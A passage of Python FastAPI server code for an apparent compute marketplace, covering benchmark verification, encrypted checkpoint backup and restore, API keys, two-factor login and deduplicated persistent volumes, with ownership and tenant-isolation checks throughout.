            "app_port": vm.app_port, "status": vm.status}


# Public trust & transparency API (/trust/summary, /jobs/{id}/receipt) lives in trust_routes.py
# — the first DB+auth domain router extracted from main via deps.py. Mounted below.
app.include_router(trust_router)


# ------------------- BENCHMARKS -------------------

@app.post("/benchmark")
def dispatch_benchmark(data: BenchmarkDispatchModel, user: dict = Depends(get_current_user),
                       db: Session = Depends(get_db)):
    """Queue a benchmark for an attested spec you own (LLM tokens/sec + extras)."""
    owner = _require_seller(db, user)
    spec = _get_spec(db, data.spec_id)
    if not spec or spec.user_id != owner.id:
        raise HTTPException(status_code=404, detail="Spec not found")
    task = create_benchmark_task(db, spec)
    return {"status": "ok", "task_id": task.id}


@app.post("/jobs/benchmark_result")
def benchmark_result(data: BenchmarkResultModel, agent=Depends(api_key_user),
                     db: Session = Depends(get_db)):
    """Agent submits a SIGNED benchmark result; recorded on the spec for buyers."""
    spec = _get_spec(db, data.spec_id)
    if not spec or spec.user_id != agent.id:
        raise HTTPException(status_code=404, detail="Spec not found or not yours")
    if not spec.attest_pubkey:
        raise HTTPException(status_code=409, detail="Spec not attested")
    try:
        verify_signed_proof(spec.attest_pubkey, data.proof, data.signature)
    except ValueError as e:
        raise HTTPException(status_code=401, detail=f"Invalid proof: {e}")

    # Server-time the benchmark + anti-replay: bind this submission to the benchmark task the
    # PLATFORM dispatched. The server observes the wall-clock from dispatch to result (so the
    # number is not purely self-reported), and consuming the task means a previously-signed
    # benchmark cannot be replayed to refresh a stale listing.
    elapsed_s = None
    pow_verified = None
    try:
        from db import Task as _Task
        btid = int((data.proof or {}).get("task_id") or 0)
    except Exception:
        btid = 0
    if btid:
        bt = (db.query(_Task).filter(_Task.id == btid, _Task.spec_id == spec.id,
                                     _Task.task_type == "benchmark").first())
        if bt is not None:
            if bt.status == "completed":
                raise HTTPException(status_code=409,
                                    detail="benchmark already submitted (replay rejected)")
            from datetime import datetime as _dt, timezone as _tz
            start = bt.assigned_at or bt.created_at
            if start is not None:
                start = start.replace(tzinfo=_tz.utc) if start.tzinfo is None else start
                elapsed_s = round(max(0.0, (_dt.now(_tz.utc) - start).total_seconds()), 3)
            # Server-seeded PROOF-OF-WORK: the node must answer THIS fresh challenge. A wrong
            # answer means the number wasn't produced by real, fresh computation on the node
            # (a fabricated/replayed benchmark can't solve a seed it never saw) -> fraud freeze.
            try:
                _ch = json.loads(bt.code or "{}")
                _seed, _size = _ch.get("bench_seed"), _ch.get("bench_size")
                _got = (data.proof or {}).get("challenge_hash")
                if _seed is not None and _size is not None and _got is not None:
                    from db import compute_test_hash
                    pow_verified = (_got == compute_test_hash(int(_size), int(_seed)))
            except Exception:
                logger.exception("benchmark proof-of-work check failed to evaluate")
            submit_task_result(db, bt, "benchmark", "completed")   # consume -> anti-replay
            if pow_verified is False:
                import seller_audit
                seller_audit.freeze_for_fraud(
                    db, spec, "benchmark proof-of-work mismatch (fabricated/stale challenge answer)")
                raise HTTPException(status_code=409, detail="benchmark proof-of-work failed")

    # Gamer-style authenticity check: compare every benchmark score inside the SIGNED proof
    # (FP16 matmul TFLOPS, Blender Open Data, Cinebench, PugetBench) against PUBLIC reference
    # data for the model the seller CLAIMS to list (spec.gpu_model). The hardware-invariant
    # FP16 metric may FREEZE payouts on a gross over-claim; render/video metrics are advisory
    # (they flag a mismatch and suppress the trust boost, but never auto-freeze).
    meta = data.meta or {}
    verdict = None
    try:
        from gpu_benchmark import classify_all
        if spec.gpu_model:
            agg = classify_all(spec.gpu_model, data.proof)
            verdict = agg["verdict"]
            if agg["results"]:
                meta = {**meta, "benchmark_checks": [
                    {"metric": r["metric"], "label": r["label"], "verdict": r["verdict"],
                     "source": r["source"], "detail": r["detail"]} for r in agg["results"]]}
            if agg["fraud"]:
                bad = next((r for r in agg["results"] if r.get("fraud")), None)
                import seller_audit
                seller_audit.freeze_for_fraud(
                    db, spec,
                    f"benchmark over-claim on {bad['metric'] if bad else '?'}: "
                    f"{spec.gpu_model} — {bad['detail'] if bad else ''}"[:200])
    except HTTPException:
        raise
    except Exception:
        logger.exception("benchmark authenticity check failed (non-fatal)")

    if elapsed_s is not None:
        meta = {**meta, "server_timed": True, "elapsed_s": elapsed_s}
    if pow_verified is not None:
        meta = {**meta, "pow_verified": pow_verified}
    set_benchmark(db, spec, data.tokens_sec, meta, verdict=verdict, elapsed_s=elapsed_s)
    # Labelled data point for the authenticity model (the data moat): the benchmark scores
    # inside the signed proof + the verdict + proof-of-work + server-timing.
    _bench_scores = {k: v for k, v in (data.proof or {}).items()
                     if k in ("tflops_fp16", "blender_optix", "cinebench_2024_gpu",
                              "pugetbench_resolve", "pugetbench_premiere", "hashrate_ethash_mhs")}
    _record_benchmark_sample(db, spec, source="benchmark", metrics=_bench_scores, verdict=verdict,
                             pow_verified=pow_verified, elapsed_s=elapsed_s, tokens_sec=data.tokens_sec)
    from db import record_rep_event
    record_rep_event(db, spec, "benchmark", data.tokens_sec)
    return {"status": "ok", "spec_id": spec.id, "tokens_sec": data.tokens_sec,
            "benchmark_verdict": verdict, "server_timed": elapsed_s is not None,
            "elapsed_s": elapsed_s, "pow_verified": pow_verified}



# ------------------- BACKUP / RESTORE -------------------

@app.post("/jobs/checkpoint")
def submit_checkpoint(data: CheckpointModel, agent=Depends(api_key_user),
                      db: Session = Depends(get_db)):
    """Agent records a SIGNED backup of a task's volume (data lives in object
    storage; we store the reference + integrity hash)."""
    task = get_task_for_agent(db, data.task_id, agent)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not yours")
    spec = _get_spec(db, task.spec_id)
    if not spec or not spec.attest_pubkey:
        raise HTTPException(status_code=409, detail="Spec not attested")
    try:
        verify_signed_proof(spec.attest_pubkey, data.proof, data.signature)
    except ValueError as e:
        raise HTTPException(status_code=401, detail=f"Invalid proof: {e}")
    cp = record_checkpoint(db, task, data.snapshot_ref, data.size_bytes, data.content_hash)
    return {"status": "ok", "checkpoint_id": cp.id, "snapshot_ref": cp.snapshot_ref}


def _storage_key_from_ref(ref: str) -> str:
    """The object key inside the bucket for a stored ref (strips a leading s3://bucket/)."""
    return ref.split("/", 3)[-1] if isinstance(ref, str) and ref.startswith("s3://") else (ref or "")


def _input_prefix(buyer_id: int) -> str:
    """The ONLY object-key prefix a buyer's inputs live under (see /uploads/url)."""
    return f"inputs/{int(buyer_id)}/"


def _ref_is_own_input(ref: str, buyer_id: int) -> bool:
    """A buyer may bind an input ref ONLY if it resolves to a key under their OWN tenant
    prefix inputs/<buyer_id>/ (the prefix /uploads/url mints). This blocks a buyer from
    binding ANOTHER tenant's object key to their task — which an assigned node would then
    be able to presign and read (cross-tenant data-exfiltration IDOR)."""
    if not isinstance(ref, str) or not ref:
        return False
    return _storage_key_from_ref(ref).startswith(_input_prefix(buyer_id))


def _authorized_input_refs(task) -> set:
    """The object-storage refs a BUYER bound to THIS task (render `blend_ref`, transcode
    `input_ref`, etc., stored in template_params). A node may mint a presigned GET only for
    one of these — never an arbitrary key. Mirrors restore_url's checkpoint-scoped check."""
    refs = set()
    try:
        params = json.loads(task.template_params or "{}")
    except Exception:  # noqa: BLE001 — malformed params -> no authorized refs (fail closed)
        params = {}
    if isinstance(params, dict):
        for k, v in params.items():
            if isinstance(v, str) and v and (k == "ref" or k.endswith("_ref")):
                refs.add(v)
    return refs


@app.post("/jobs/input_url")
def input_url(data: InputUrlModel, agent=Depends(api_key_user),
              db: Session = Depends(get_db)):
    """Pre-signed GET so a node can pull a job input (e.g. a .blend scene) it was
    assigned — without holding standing object-storage credentials."""
    task = get_task_for_agent(db, data.task_id, agent)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not yours")
    # The ref MUST be one the buyer associated with this task. Without this, an assigned node
    # could mint a GET for any object on the shared, tenant-prefixed bucket (another buyer's
    # inputs/checkpoints) — a cross-tenant data-exfiltration IDOR.
    if data.ref not in _authorized_input_refs(task):
        raise HTTPException(status_code=404, detail="Input ref not associated with this task")
    key = _storage_key_from_ref(data.ref)
    # Authoritative backstop: even a bound ref must resolve to THIS task-buyer's own input
    # prefix. Bind-time validation (/transcode, /render) already rejects foreign refs, but a
    # node must never be able to presign another tenant's object regardless of how the ref
    # got into template_params.
    if not key.startswith(_input_prefix(task.buyer_id)):
        raise HTTPException(status_code=404, detail="Input ref not associated with this task")
    try:
        url = mint_presigned_get(key)
    except ValueError as e:
        raise HTTPException(status_code=503, detail=str(e))
    return {"download_url": url, "key": key, "expires_in": 900}


@app.post("/jobs/backup_url")
def backup_url(data: BackupUrlModel, agent=Depends(api_key_user),
               db: Session = Depends(get_db)):
    """Mint a per-object, time-limited pre-signed PUT URL + the per-task encryption
    key. The node uploads ONE encrypted object and holds no standing credentials."""
    task = get_task_for_agent(db, data.task_id, agent)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not yours")
    key = s3_key_for(task.buyer_id, task.id, data.filename)   # tenant-prefixed
    try:
        url = mint_presigned_put(key)
    except ValueError as e:
        raise HTTPException(status_code=503, detail=str(e))
    enc_key = get_or_create_task_enc_key(db, task)            # client-side encryption
    return {"upload_url": url, "snapshot_ref": s3_uri(key), "key": key,
            "enc_key": enc_key, "expires_in": 900}


@app.post("/jobs/restore_url")
def restore_url(data: RestoreUrlModel, agent=Depends(api_key_user),
                db: Session = Depends(get_db)):
    """Mint a pre-signed GET URL + the per-task key + the signed content hash so the
    node can download, VERIFY integrity, and decrypt the backup before restoring."""
    task = get_task_for_agent(db, data.task_id, agent)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not yours")
    from db import Checkpoint
    cp = (db.query(Checkpoint)
          .filter(Checkpoint.task_id == task.id, Checkpoint.snapshot_ref == data.snapshot_ref)
          .first())
    if not cp:
        raise HTTPException(status_code=404, detail="Unknown snapshot for this task")
    key = data.snapshot_ref.split("/", 3)[-1] if data.snapshot_ref.startswith("s3://") else data.snapshot_ref
    try:
        url = mint_presigned_get(key)
    except ValueError as e:
        raise HTTPException(status_code=503, detail=str(e))
    enc_key = get_or_create_task_enc_key(db, task)
    return {"download_url": url, "content_hash": cp.content_hash, "enc_key": enc_key,
            "expires_in": 900}


@app.get("/tasks/{task_id}/checkpoints")
def task_checkpoints(task_id: int, user: dict = Depends(get_current_user),
                     db: Session = Depends(get_db)):
    from db import Task
    buyer = get_user_by_username(db, _username(user))
    task = db.query(Task).filter(Task.id == task_id).first()
    if not task or not buyer or task.buyer_id != buyer.id:
        raise HTTPException(status_code=404, detail="Task not found")
    cps = list_checkpoints(db, task_id)
    return {"task_id": task_id, "latest": task.latest_checkpoint_ref,
            "checkpoints": [{"id": c.id, "snapshot_ref": c.snapshot_ref,
                             "size_bytes": c.size_bytes, "created_at": str(c.created_at)}
                            for c in cps]}


@app.post("/tasks/{task_id}/restore")
def restore_task(task_id: int, data: RestoreModel, user: dict = Depends(get_current_user),
                 db: Session = Depends(get_db)):
    """Buyer restores a task from a checkpoint (latest by default) — re-queues it so
    a node picks it up and restores the volume before resuming."""
    from db import Task, Checkpoint
    buyer = get_user_by_username(db, _username(user))
    task = db.query(Task).filter(Task.id == task_id).first()
    if not task or not buyer or task.buyer_id != buyer.id:
        raise HTTPException(status_code=404, detail="Task not found")
    ref = task.latest_checkpoint_ref
    if data.checkpoint_id is not None:
        cp = db.query(Checkpoint).filter(Checkpoint.id == data.checkpoint_id,
                                         Checkpoint.task_id == task_id).first()
        if not cp:
            raise HTTPException(status_code=404, detail="Checkpoint not found")
        ref = cp.snapshot_ref
    if not ref:
        raise HTTPException(status_code=409, detail="No checkpoint to restore from")
    reschedule_task(db, task, ref)
    return {"status": "ok", "task_id": task_id, "restore_from": ref, "task_status": "pending"}


# ------------------- JOB MANAGEMENT -------------------

@app.post("/tasks/{task_id}/retry")
def retry_task_endpoint(task_id: int, user: dict = Depends(get_current_user),
                        db: Session = Depends(get_db)):
    """Buyer re-queues a failed task (bounded retries)."""
    from db import Task, ComputeTransaction
    buyer = get_user_by_username(db, _username(user))
    task = db.query(Task).filter(Task.id == task_id).first()
    if not task or not buyer or task.buyer_id != buyer.id:
        raise HTTPException(status_code=404, detail="Task not found")
    # A Stripe-native task whose card authorization was VOIDED when the job failed cannot be
    # retried in place: re-queueing would let a completed retry return success while the PI is
    # canceled (buyer never charged, seller never paid via Stripe). The one-time authorization is
    # gone — the buyer must place a NEW order. (Legacy wallet-escrow tasks have no tx and retry
    # normally, since their escrow is retained.)
    ntx = db.query(ComputeTransaction).filter(ComputeTransaction.task_id == task.id).first()
    if ntx is not None:
        import marketplace_insight as _mi
        if ntx.status in _mi.TX_FAILED:
            raise HTTPException(status_code=409, detail=(
                "This order's card authorization was voided when the job failed — a retry cannot "
                "re-charge it. Place a new order to run this workload again."))
    if not retry_task(db, task):
        raise HTTPException(status_code=409, detail="Task not retryable (not failed or retry limit)")
    return {"status": "ok", "task_id": task.id, "task_status": "pending", "retries": task.retries}


@app.post("/jobs/progress")
def report_progress(data: ProgressModel, agent=Depends(api_key_user),
                    db: Session = Depends(get_db)):
    task = get_task_for_agent(db, data.task_id, agent)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not yours")
    set_task_progress(db, task, data.percent, data.message)
    return {"status": "ok", "progress": task.progress}


@app.post("/jobs/log")
def report_log(data: LogModel, agent=Depends(api_key_user),
               db: Session = Depends(get_db)):
    task = get_task_for_agent(db, data.task_id, agent)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not yours")
    add_task_log(db, data.task_id, data.line)
    return {"status": "ok"}


@app.websocket("/ws/tasks/{task_id}/logs")
async def task_logs_ws(websocket: WebSocket, task_id: int, token: str = ""):
    """Live log stream for a task the buyer owns. Auth via the HttpOnly session cookie (sent
    automatically on the WS handshake) or, for CLI/API clients, a ?token=<JWT> query param."""
    await websocket.accept()
    db = SessionLocal()
    try:
        try:
            claims = verify_token(token or websocket.cookies.get(SESSION_COOKIE, ""))
        except ValueError:
            await websocket.close(code=4401); return
        from db import Task
        buyer = get_user_by_username(db, claims.get("sub"))
        task = db.query(Task).filter(Task.id == task_id).first()
        if not task or not buyer or task.buyer_id != buyer.id:
            await websocket.close(code=4404); return
        last_id = 0
        import asyncio as _a
        for _ in range(600):   # ~5 min tail cap
            for row in get_task_logs(db, task_id, last_id):
                last_id = row.id
                await websocket.send_text(row.line)
            t = db.query(Task).filter(Task.id == task_id).first()
            if t and t.status in ("completed", "failed"):
                await websocket.send_text(f"[task {t.status}]")
                break
            await _a.sleep(0.5)
    except WebSocketDisconnect:
        pass
    finally:
        db.close()


# ------------------- ORG COST ANALYTICS -------------------

@app.get("/orgs/{org_id}/analytics")
def org_analytics_endpoint(org_id: int, user: dict = Depends(get_current_user),
                           db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    if not get_membership(db, org_id, me.id):
        raise HTTPException(status_code=403, detail="Not a member")
    return {"org_id": org_id, **org_analytics(db, org_id)}


# ------------------- API KEYS -------------------

@app.post("/create_api_key", tags=["account"])
def create_api_key(days: int = Query(7, ge=1, le=90),
                   scopes: Optional[str] = Query(None, description="comma-separated, e.g. node,jobs"),
                   label: Optional[str] = Query(None),
                   user: dict = Security(get_current_user),
                   db: Session = Depends(get_db)):
    """Mint a node/API key. A user may hold MANY keys at once — mint ONE PER COMPUTER so each
    machine's agent runs with its own key (and its own spec). `label` (e.g. the hostname) makes
    them easy to tell apart and revoke individually at /account/keys. This is how one account runs
    a fleet of computers; those distinct machines can even join the same distributed cluster."""
    scope_list = [x.strip() for x in scopes.split(",") if x.strip()] if scopes else list(DEFAULT_KEY_SCOPES)
    api_key, jti = gen_secure_api_key(_username(user), days, scope_list)
    me = get_user_by_username(db, _username(user))
    record_issued_key(db, me.id, jti, label, scope_list, days)
    audit(db, "apikey.create", actor=me, resource_type="api_key", resource_id=jti,
          detail={"scopes": scope_list, "days": days, "label": label})
    return {"status": "ok", "api_key": api_key, "jti": jti, "scopes": scope_list}


@app.get("/account/keys")
def list_keys(user: dict = Security(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    return {"keys": list_issued_keys(db, me.id)}


@app.get("/account/audit", tags=["account"])
def account_audit_endpoint(limit: int = Query(100, ge=1, le=500),
                           user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """The signed-in user's own audit trail — every security-relevant action they took (logins,
    key create/revoke, role & team changes, withdrawals), newest first. Immutable and
    hash-chained; `integrity` reports whether the chain still verifies (tamper-evidence)."""
    me = get_user_by_username(db, _username(user))
    return {"events": list_audit_for_actor(db, me.id, limit=limit),
            "integrity": verify_audit_chain(db)}


# ------------------- TWO-FACTOR AUTH (TOTP / authenticator app) -------------------

@app.get("/account/2fa", tags=["account"])
def totp_state(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    return {"enabled": bool(me.totp_enabled),
            "pending": bool(me.totp_secret and not me.totp_enabled)}


@app.post("/account/2fa/setup", tags=["account"])
def totp_setup(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Begin enrollment: mint a fresh secret, store it PENDING (encrypted at rest), and return the
    secret + otpauth URI so the user can add it to their authenticator app. 2FA is not active until
    /account/2fa/enable confirms a code."""
    me = get_user_by_username(db, _username(user))
    if me.totp_enabled:
        raise HTTPException(status_code=409,
                            detail="2FA is already on — disable it first to re-enroll.")
    secret = totp.random_base32()
    set_totp_secret(db, me, seal_secret(secret))
    acct = me.email or me.username
    return {"secret": secret, "otpauth_uri": totp.provisioning_uri(secret, acct),
            "issuer": totp.DEFAULT_ISSUER, "account": acct}


@app.post("/account/2fa/enable", tags=["account"])
def totp_enable_endpoint(data: TotpEnableModel, user: dict = Depends(get_current_user),
                         db: Session = Depends(get_db)):
    """Confirm enrollment with the current password + a code from the app. On success, 2FA is on
    and a one-time list of recovery (backup) codes is returned — shown ONCE."""
    me = get_user_by_username(db, _username(user))
    if not verify_password(data.password, me.password):
        raise HTTPException(status_code=403, detail="Password is incorrect.")
    if not me.totp_secret:
        raise HTTPException(status_code=400, detail="Start setup first (POST /account/2fa/setup).")
    try:
        sec = open_secret(me.totp_secret)
    except Exception:  # noqa: BLE001
        raise HTTPException(status_code=400, detail="Setup expired — start again.")
    if not totp.verify(sec, data.code):
        raise HTTPException(status_code=400, detail={
            "code": "TOTP_INVALID", "message": "That code is incorrect or expired."})
    backups = [secrets.token_hex(5) for _ in range(10)]
    enable_totp(db, me, [hash_backup_code(b) for b in backups])
    audit(db, "2fa.enabled", actor=me, resource_type="user", resource_id=me.username)
    return {"status": "ok", "enabled": True, "backup_codes": backups,
            "note": "Save these recovery codes now — each works once and they are shown only here."}


@app.post("/account/2fa/disable", tags=["account"])
def totp_disable_endpoint(data: TotpDisableModel, user: dict = Depends(get_current_user),
                          db: Session = Depends(get_db)):
    """Turn 2FA off. Requires the password AND a current code (or a backup code) — so a password
    alone (without the phone) cannot strip the second factor."""
    me = get_user_by_username(db, _username(user))
    if not verify_password(data.password, me.password):
        raise HTTPException(status_code=403, detail="Password is incorrect.")
    if not me.totp_enabled:
        return {"status": "ok", "enabled": False}
    code = (data.code or "").strip()
    ok2 = False
    try:
        sec = open_secret(me.totp_secret) if me.totp_secret else None
        ok2 = bool(sec and totp.verify(sec, code))
    except Exception:  # noqa: BLE001
        ok2 = False
    if not ok2:
        ok2 = consume_backup_code(db, me, code.replace("-", "").replace(" ", "").lower())
    if not ok2:
        raise HTTPException(status_code=400, detail={
            "code": "TOTP_INVALID", "message": "Enter a current 2FA code to disable."})
    disable_totp(db, me)
    audit(db, "2fa.disabled", actor=me, resource_type="user", resource_id=me.username)
    return {"status": "ok", "enabled": False}


# ============================ PERSISTENT VOLUMES (incremental) ============================
# Buyer-owned storage that outlives any single VM. Snapshots are CONTENT-ADDRESSED and
# INCREMENTAL: files are chunked at file granularity by their sha256, identical/unchanged
# content is stored exactly once, and each new snapshot only uploads the DELTA (the blobs it
# doesn't already have). Restoring "since" an earlier snapshot returns only the changed files.
# This is deliberately NOT a full-disk mirror — you pay for unique bytes, not for every copy.
#
# Two-phase write (agent/CLI side):
#   1. POST /volumes/{id}/snapshot/plan  -> which blobs are MISSING (the delta to upload)
#   2. PUT  /volumes/{id}/blobs/{sha256} -> upload each missing blob's bytes (sha-verified)
#   3. POST /volumes/{id}/snapshot       -> record the manifest; delta_bytes is what was new
# Restore (any later VM):
#   GET /volumes/{id}/snapshots/{sid}/restore[?since=<sid>] -> manifest + per-blob download path

VOLUME_MAX_BLOB_MB = int(os.getenv("VOLUME_MAX_BLOB_MB", "1024"))   # cap for the through-API path


def _volume_blob_key(buyer_id: int, volume_id: int, sha256: str) -> str:
    """Object-storage key for one content blob. Namespaced per buyer+volume so a sha collision
    across tenants can never cross-read, and so deleting a volume is a clean prefix wipe."""
    return f"volumes/{buyer_id}/{volume_id}/blobs/{sha256}"


def _require_object_storage():
    if not os.getenv("S3_BUCKET"):
        raise HTTPException(status_code=503, detail=(
            "Object storage is not configured on this deployment (set S3_BUCKET). "
            "Volumes require object storage."))


def _owned_volume(db, me, volume_id: int):
    """Load a volume and enforce ownership. Returns the Volume or raises 404 (we 404 rather than
    403 on someone else's id so volume ids aren't enumerable across tenants)."""
    v = get_volume(db, volume_id)
    if not v or v.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="Volume not found")
    return v


@app.post("/volumes", tags=["storage"])
def create_volume_endpoint(data: VolumeCreateModel, request: Request,
                           user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Create a persistent volume for the signed-in buyer."""
    me = get_user_by_username(db, _username(user))
    v = create_volume(db, me, data.name, size_limit_gb=data.size_limit_gb)
    audit(db, "volume.create", actor=me, resource_type="volume", resource_id=v.id,
          ip=_client_ip(request), detail={"name": v.name, "size_limit_gb": v.size_limit_gb})
    return {"status": "ok", "id": v.id, "name": v.name, "size_limit_gb": v.size_limit_gb,
            "bytes_stored": v.bytes_stored, "snapshots": v.snapshot_count}


@app.get("/volumes", tags=["storage"])
def list_volumes_endpoint(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """The signed-in buyer's volumes (newest first) with real deduplicated bytes held."""
    me = get_user_by_username(db, _username(user))
    return {"volumes": list_volumes(db, me.id)}


@app.get("/volumes/{volume_id}", tags=["storage"])
def get_volume_endpoint(volume_id: int, user: dict = Depends(get_current_user),
                        db: Session = Depends(get_db)):
    """One volume with its snapshots. `logical_bytes` is what the newest snapshot represents;
    `bytes_stored` is what we actually keep after dedup — the gap is the savings."""
    me = get_user_by_username(db, _username(user))
    v = _owned_volume(db, me, volume_id)
    snaps = list_snapshots(db, volume_id)
    logical = snaps[0]["total_bytes"] if snaps else 0
    return {"id": v.id, "name": v.name, "size_limit_gb": v.size_limit_gb,
            "bytes_stored": v.bytes_stored, "snapshot_count": v.snapshot_count,
            "logical_bytes": logical,
            "dedup_saved_bytes": max(0, sum(s["total_bytes"] for s in snaps) - v.bytes_stored),
            "created_at": v.created_at.isoformat() if v.created_at else None,
            "snapshots": snaps}


@app.delete("/volumes/{volume_id}", tags=["storage"])
def delete_volume_endpoint(volume_id: int, request: Request,
                           user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Delete a volume, all its snapshots, and every content blob it held (from object storage)."""
    me = get_user_by_username(db, _username(user))
    v = _owned_volume(db, me, volume_id)
    _require_object_storage()
    shas = delete_volume(db, v)
    removed = 0
    for sha in shas:
        try:
            s3_delete(_volume_blob_key(me.id, volume_id, sha))
            removed += 1
        except Exception:  # noqa: BLE001 — index row is already gone; a stray object is harmless
            pass
    audit(db, "volume.delete", actor=me, resource_type="volume", resource_id=volume_id,
          ip=_client_ip(request), detail={"blobs_removed": removed})
    return {"status": "ok", "id": volume_id, "blobs_removed": removed}


@app.post("/volumes/{volume_id}/snapshot/plan", tags=["storage"])
def plan_snapshot_endpoint(volume_id: int, data: SnapshotPlanModel,
                           user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Given the manifest you WANT to snapshot, return which blobs are missing (the delta to
    upload) vs. already held (deduped). Only the missing blobs need to be PUT."""
    me = get_user_by_username(db, _username(user))
    _owned_volume(db, me, volume_id)
    files = [f.model_dump() for f in data.files]
    plan = plan_snapshot(db, volume_id, files)
    for m in plan["missing"]:
        m["upload_path"] = f"/volumes/{volume_id}/blobs/{m['sha256']}"
    return plan


@app.put("/volumes/{volume_id}/blobs/{sha256}", tags=["storage"])
async def put_volume_blob(volume_id: int, sha256: str, request: Request,
                          user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Upload one content blob's bytes. The server verifies sha256(body) matches the URL — content
    addressing is enforced server-side, so a client can't mislabel content. Idempotent: an
    already-stored blob is a no-op (deduped)."""
    me = get_user_by_username(db, _username(user))
    v = _owned_volume(db, me, volume_id)
    _require_object_storage()
    sha = (sha256 or "").strip().lower()
    if not _SHA256_RE.match(sha):
        raise HTTPException(status_code=400, detail="sha256 must be 64 lowercase hex characters")
    max_bytes = VOLUME_MAX_BLOB_MB * 1024 * 1024
    clen = request.headers.get("content-length")
    if clen and clen.isdigit() and int(clen) > max_bytes:
        raise HTTPException(status_code=413, detail=f"Blob exceeds {VOLUME_MAX_BLOB_MB} MB limit")
    # Stream with a hard cap: a chunked upload (no Content-Length) would otherwise skip the header
    # check above and buffer the ENTIRE body into RAM via request.body() before any size check,
    # OOMing the worker. Abort the moment cumulative bytes exceed the cap.
    _chunks, _total = [], 0
    async for _chunk in request.stream():
        _total += len(_chunk)
        if _total > max_bytes:
            raise HTTPException(status_code=413, detail=f"Blob exceeds {VOLUME_MAX_BLOB_MB} MB limit")
        _chunks.append(_chunk)
    body = b"".join(_chunks)
    actual = hashlib.sha256(body).hexdigest()
    if actual != sha:
        raise HTTPException(status_code=400, detail={
            "code": "SHA_MISMATCH", "message": "Body sha256 does not match the URL",
            "expected": sha, "actual": actual})
    key = _volume_blob_key(me.id, volume_id, sha)
    # Already held if it's indexed (from a prior snapshot) OR its bytes are already in storage
    # (uploaded earlier in this snapshot). Content addressing makes a re-PUT a safe no-op.
    already = volume_blob_exists(db, volume_id, sha) or s3_exists(key)
    if not already:
        if v.size_limit_gb:
            limit = int(v.size_limit_gb) * 1024 * 1024 * 1024
            if int(v.bytes_stored or 0) + len(body) > limit:
                raise HTTPException(status_code=413, detail="Volume size limit reached")
        s3_put_bytes(key, body)
    return {"status": "ok", "sha256": sha, "size": len(body), "deduped": already}


@app.get("/volumes/{volume_id}/blobs/{sha256}", tags=["storage"])
def get_volume_blob(volume_id: int, sha256: str, user: dict = Depends(get_current_user),
                    db: Session = Depends(get_db)):
    """Download one content blob's bytes (to reconstruct a file during restore)."""
    me = get_user_by_username(db, _username(user))
    _owned_volume(db, me, volume_id)
    _require_object_storage()
    sha = (sha256 or "").strip().lower()
    if not _SHA256_RE.match(sha):
        raise HTTPException(status_code=400, detail="bad sha256")
    if not volume_blob_exists(db, volume_id, sha):
        raise HTTPException(status_code=404, detail="Blob not found in this volume")
    try:
        data = s3_get_bytes(_volume_blob_key(me.id, volume_id, sha))
    except Exception:  # noqa: BLE001
        raise HTTPException(status_code=404, detail="Blob object is missing from storage")
    return Response(content=data, media_type="application/octet-stream")


@app.post("/volumes/{volume_id}/snapshot", tags=["storage"])
def create_snapshot_endpoint(volume_id: int, data: SnapshotCreateModel, request: Request,
                             user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Record a snapshot from a manifest. Every referenced blob must already be in object storage
    (uploaded now, or held from a previous snapshot). `delta_bytes` is the NEW unique bytes this
    snapshot added — that's all you're billed for."""
    me = get_user_by_username(db, _username(user))
    v = _owned_volume(db, me, volume_id)
    _require_object_storage()
    files = [f.model_dump() for f in data.files]
    # Enforce the size cap on the delta this snapshot would commit (new unique bytes only).
    plan = plan_snapshot(db, volume_id, files)
    if v.size_limit_gb:
        limit = int(v.size_limit_gb) * 1024 * 1024 * 1024
        if int(v.bytes_stored or 0) + int(plan["missing_bytes"]) > limit:
            raise HTTPException(status_code=413, detail="Volume size limit reached")
    # present_shas = blobs physically in object storage for this volume (indexed OR just-uploaded).
    present = set(volume_blob_shas(db, volume_id))
    for m in plan["missing"]:
        try:
            s3_get_bytes(_volume_blob_key(me.id, volume_id, m["sha256"]))
            present.add(m["sha256"])
        except Exception:  # noqa: BLE001 — a referenced blob was never uploaded
            pass
    try:
        snap = finalize_snapshot(db, v, files, present, label=data.label, vm_id=data.vm_id)
    except ValueError as e:
        raise HTTPException(status_code=400, detail={"code": "BLOB_MISSING", "message": str(e)})
    audit(db, "volume.snapshot", actor=me, resource_type="volume", resource_id=volume_id,
          ip=_client_ip(request),
          detail={"seq": snap.seq, "delta_bytes": snap.delta_bytes, "files": len(files)})
    return {"status": "ok", "id": snap.id, "seq": snap.seq, "label": snap.label,
            "files": len(files), "total_bytes": snap.total_bytes, "delta_bytes": snap.delta_bytes,
            "reused_blobs": plan["reused_blobs"], "bytes_stored": v.bytes_stored}


@app.get("/volumes/{volume_id}/snapshots/{snapshot_id}/restore", tags=["storage"])
def restore_snapshot_endpoint(volume_id: int, snapshot_id: int,
                              since: Optional[int] = Query(None),
                              user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """The manifest to reconstruct a snapshot, each file annotated with its blob download path.
    With `since=<earlier snapshot id>`, return ONLY the files whose content changed since then —
    the delta the client still needs (it already has the rest locally). 'Once a user needs it,
    send the delta.'"""
    me = get_user_by_username(db, _username(user))
    _owned_volume(db, me, volume_id)
    snap = get_snapshot(db, volume_id, snapshot_id)
    if not snap:
        raise HTTPException(status_code=404, detail="Snapshot not found")
    base = None
    if since is not None:
        base = get_snapshot(db, volume_id, since)
        if not base:
            raise HTTPException(status_code=404, detail="`since` snapshot not found")
    res = restore_manifest(db, volume_id, snap, since=base)
    for f in res["files"]:
